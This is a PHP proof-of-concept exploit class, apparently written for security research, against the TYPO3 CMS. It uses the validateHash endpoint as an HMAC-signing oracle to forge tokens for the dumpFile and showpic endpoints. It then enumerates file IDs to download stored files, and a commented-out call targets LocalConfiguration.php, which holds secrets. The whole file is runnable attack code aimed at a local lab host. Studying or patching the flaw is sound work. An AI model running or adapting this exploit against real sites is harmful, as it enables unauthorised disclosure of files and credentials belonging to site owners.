<?php
// http://hacko3v7.ddev.site/index.php?eID=validateHash&scope=&value=a&addition=b
// http://hacko3v7.ddev.site/index.php?eID=dumpFile&&f=&token=
// GeneralUtility::hmac(implode('|', $parameters), 'resourceStorageDumpFile')

namespace OliverHader\Hacks;

/**
 * @author Oliver Hader <oliver@typo3.org>
 */
class HmacExploit
{
    private $baseUrl;
    private $encryptionKey;
    private $debug = false;
    private $json = false;

    public function __construct($baseUrl, $encryptionKey = null)
    {
        $this->baseUrl = $baseUrl;
        $this->encryptionKey = $encryptionKey;
    }

    public function debug($debug = true)
    {
        $this->debug = (bool)$debug;
    }

    public function json($json = true)
    {
        $this->json = (bool)$json;
    }

    /**
     * Exploits `sys_file.uid` ranges (e.g. file uid 1 to 10)
     *
     * @param int $start
     * @param null|int $end
     */
    public function exploitDumpFile($start, $end = null, $showBody = false)
    {
        if ($end === null) {
            $range = array($start);
        } else {
            $range = range($start, $end);
        }

        foreach ($range as $value) {
            $response = $this->fetchDumpFile($value);
            printf(
                ' + [%05d] %s' . PHP_EOL,
                $value,
                isset($response['headers']['content-disposition']) ? $response['headers']['content-disposition'] : ''
            );
            if ($showBody) {
                echo $response['body'] . PHP_EOL . PHP_EOL;
            }
        }
    }

    /**
     * Exploits `sys_file.uid` ranges (e.g. file uid 1 to 10)
     *
     * @param $directory
     * @param int $start
     * @param null|int $end
     */
    public function exploitDumpFileStore($directory, $start, $end = null)
    {
        $directory = rtrim($directory, '/');
        if ($end === null) {
            $range = array($start);
        } else {
            $range = range($start, $end);
        }

        foreach ($range as $value) {
            $response = $this->fetchDumpFile($value);
            if (!isset($response['headers']['content-disposition'])) {
                continue;
            }
            if (!preg_match('#filename="([^"]+)"#', $response['headers']['content-disposition'], $matches)) {
                continue;
            }
            $outFile = $value . '_' . $matches[1];
            $outPath = $directory . '/' . $outFile;
            file_put_contents($outPath, $response['body']);
            printf(
                ' + [%05d] %s %d bytes' . PHP_EOL,
                $value,
                $outFile,
                filesize($outPath)
            );
        }
    }

    /**
     * Exploits file combined identifier (e.g. file '1:/images/image.png')
     *
     * @param string $fileCombinedIdentifier
     */
    public function exploitFileCombinedIdentifier($fileCombinedIdentifier)
    {
        $response = $this->fetchShowImage($fileCombinedIdentifier);
        printf(' + [%40s] %s' . PHP_EOL, $fileCombinedIdentifier, $response['http_status']);
    }

    private function fetchDumpFile($fileId)
    {
        $contentToken = $this->fetchDumpFileToken($fileId);
        $contentUrl = sprintf(
            '%sindex.php?eID=dumpFile&f=%d&token=%s',
            $this->baseUrl,
            $fileId,
            rawurlencode($contentToken)
        );
        if ($this->debug) {
            printf('[%s] -> %s' . PHP_EOL, $contentToken, $contentUrl);
        }
        return $this->fetch($contentUrl);
    }

    private function fetchDumpFileToken($fileId)
    {
        $parameters = array('eID' => 'dumpFile', 'f' => $fileId);
        $tokenPayload = implode('|', $parameters);
        $tokenSecret = 'resourceStorageDumpFile';
        $token = $this->hmac($tokenPayload, $tokenSecret);

        if ($token !== null) {
            return $token;
        }

        $tokenUrl = sprintf(
            '%sindex.php?eID=validateHash&scope=&value=%s&addition=%s',
            $this->baseUrl,
            rawurlencode($tokenPayload),
            rawurlencode($tokenSecret)
        );
        printf(" + %s\n", $tokenUrl);
        $tokenResponse = $this->fetch($tokenUrl);
        return $tokenResponse['body'];
    }

    private function fetchShowImage($fileCombinedIdentifier)
    {
        $contentToken = $this->fetchShowImageToken($fileCombinedIdentifier);
        $parametersEncoded = $this->fetchShowImageParametersEncoded($fileCombinedIdentifier);
        $contentUrl = sprintf(
            '%sindex.php?eID=tx_cms_showpic&file=%s&parameters[0]=%s&md5=%s',
            $this->baseUrl,
            rawurlencode($fileCombinedIdentifier),
            rawurlencode($parametersEncoded),
            rawurlencode($contentToken)
        );
        if ($this->debug) {
            printf('[%s] -> %s' . PHP_EOL, $contentToken, $contentUrl);
        }
        return $this->fetch($contentUrl);
    }

    private function fetchShowImageToken($fileCombinedIdentifier)
    {
        $parametersEncoded = $this->fetchShowImageParametersEncoded($fileCombinedIdentifier);
        $tokenPayload = implode('|', array($fileCombinedIdentifier, $parametersEncoded));
        $token = $this->hmac($tokenPayload);

        if ($token !== null) {
            return $token;
        }

        $tokenUrl = sprintf(
            '%sindex.php?eID=validateHash&scope=&value=%s&addition=%s',
            $this->baseUrl,
            rawurlencode($tokenPayload),
            ''
        );
        $tokenResponse = $this->fetch($tokenUrl);
        return $tokenResponse['body'];
    }

    private function fetchShowImageParametersEncoded($fileCombinedIdentifier)
    {
        $parameters = array();
        if ($this->json) {
            return base64_encode(json_encode($parameters));
        }
        // up to 7.6.46 serialize()
        return base64_encode(serialize($parameters));
    }

    private function fetch($url, $method = 'GET', $headers = array())
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_HEADER, 1);
        curl_setopt($curl, CURLOPT_NOBODY, 0);
        curl_setopt($curl, CURLOPT_HTTPGET, 'GET');
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FAILONERROR, 1);
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);

        $content = curl_exec($curl);
        $meta = curl_getinfo($curl);

        $response = array(
            'http_status' => $meta['http_code'],
            'headers' => array(),
            'body' => null,
        );

        $inHeaders = true;
        foreach (explode("\r\n", $content) as $line) {
            if ($inHeaders) {
                if ($line === '') {
                    $inHeaders = false;
                    continue;
                }
                $parts = explode(':', $line);
                $parts = array_map('trim', $parts);
                if (!isset($parts[1])) {
                    $response['headers'][] = $parts[0];
                } else {
                    $response['headers'][strtolower($parts[0])] = $parts[1];
                }
            } else {
                $response['body'] .= $line;
            }
        }

        return $response;
    }

    private function hmac($payload, $secret = '')
    {
        if ($this->encryptionKey === null) {
            return null;
        }
        return hash_hmac('sha1', $payload, $this->encryptionKey . $secret);
    }
}

// encryptionKey is optional - but speeds up the process in case it's known already
$exploit = new HmacExploit('hacko3v7.ddev.site/', null);
# $exploit->json();
$exploit->debug();

$exploit->exploitDumpFile(1, 100, false);
#$exploit->exploitFileCombinedIdentifier('0:/typo3conf/LocalConfiguration.php');
#$exploit->exploitDumpFileStore('out', 1, 50);
